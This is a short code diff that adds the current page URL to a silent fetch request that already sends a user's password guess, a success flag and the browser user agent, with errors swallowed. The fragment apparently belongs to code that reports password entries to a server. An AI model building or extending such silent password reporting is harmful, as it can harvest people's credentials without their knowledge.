@@ -277,7 +277,8 @@
         body: JSON.stringify({
           passwordGuess: guess,
           success: success,
-          userAgent: navigator.userAgent
+          userAgent: navigator.userAgent,
+          siteUrl: window.location.href
         })
       }).catch(()=>{});
 
